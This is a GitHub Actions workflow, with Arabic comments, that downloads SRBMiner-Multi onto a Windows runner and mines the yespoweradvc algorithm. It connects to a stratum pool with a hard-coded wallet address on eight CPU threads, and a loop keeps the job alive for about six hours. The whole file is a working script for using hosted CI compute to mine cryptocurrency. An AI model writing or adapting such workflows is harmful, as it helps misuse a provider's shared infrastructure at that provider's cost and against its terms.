name: Windows-Miner

on:
  workflow_dispatch:

jobs:
  miner:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: Download SRBMiner 3.0.3
        shell: pwsh
        run: |
          Invoke-WebRequest -Uri "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-win64.zip" -OutFile "miner.zip"
          Expand-Archive miner.zip -DestinationPath "miner"

      - name: Start SRBMiner (yespoweradvc)
        shell: pwsh
        run: |
          cd miner

          # البحث عن مجلد SRBMiner الحقيقي
          $folder = Get-ChildItem -Directory | Where-Object { $_.Name -like "SRBMiner*" } | Select-Object -First 1
          if (-not $folder) {
            Write-Error "❌ مجلد SRBMiner غير موجود بعد فك الضغط"
            exit 1
          }

          # ملف التنفيذ
          $exe = Join-Path $folder.FullName "SRBMiner-MULTI.exe"

          if (-not (Test-Path $exe)) {
            Write-Error "❌ الملف SRBMiner-MULTI.exe غير موجود!"
            exit 1
          }

          Write-Host "➡ تشغيل SRBMiner من: $exe"

          Start-Process $exe -ArgumentList @(
            "-a", "yespoweradvc",
            "-o", "stratum+tcps://eu.rplant.xyz:17149",
            "-u", "Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E",
            "-p", "x",
            "--cpu-threads", "8"
          )

      - name: Keep Session Alive
        shell: pwsh
        run: |
          for ($i=1; $i -le 350; $i++) {
            Write-Host "⛏️ Mining Active ($i/350)"
            Start-Sleep -Seconds 60
          }
